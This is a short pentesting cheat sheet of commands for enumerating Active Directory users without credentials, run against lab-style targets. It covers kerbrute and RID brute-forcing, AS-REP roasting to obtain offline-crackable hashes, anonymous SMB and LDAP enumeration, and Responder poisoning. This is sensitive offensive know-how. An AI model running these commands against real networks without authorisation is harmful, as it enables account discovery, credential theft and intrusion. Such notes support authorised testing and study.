---
title: Enumerating users (No credentials)
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/enumerating-users-no-credentials
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

Seeking for a foothold heh?

## Kerbrute usernames

A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.

```
./kerbrute_linux_amd64 userenum -d rebound.htb --dc 10.10.11.231 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

## Getting users with impacket-lookupsid

```
impacket-lookupsid rebound.htb/anon@10.10.11.231
```

## Crackmapexec rid-brute

```
crackmapexec smb rebound.htb -u anonymous -p "" --rid-brute 10000
```

## AS-REP Roasting

AS-REP roasting is an attack against Kerberos for user that don't require preauthentication During preauthentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request. From there, the TGT will be issued for the user to use for future authentication. If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.

```
impacket-GetNPUsers zsm.local/marcus -no-pass -request -format hashcat -outputfile outfile
```

## Guest access smb share

First list all shares:

```
smbclient -L //10.10.110.55
```

```
crackmapexec smb 192.168.210.10 -u 'a' -p '' --shares
```

```
enum4linux -a -u "" -p "" 10.10.110.55 && enum4linux -a -u "guest" -p "" 10.10.110.55
```

Connect to share:

```
smbclient //10.10.110.55/sharename
```

## Enumerate LDAP

```
ldapsearch -x -h 10.10.110.55 -s <base>
```

```
nmap -n -sV --script "ldap* and not brute" -p 389 10.10.110.55
```

## Relay/poisoning

```
sudo responder -I tun0 -v
```

## AD-enumerator.py

Windows Active Directory enumeration tool for Linux, written in Python. Can be used to quickly enumerate popular services on a Windows Domain Controller.

```
ad-enumerator.py -t 10.10.10.10 -A
```
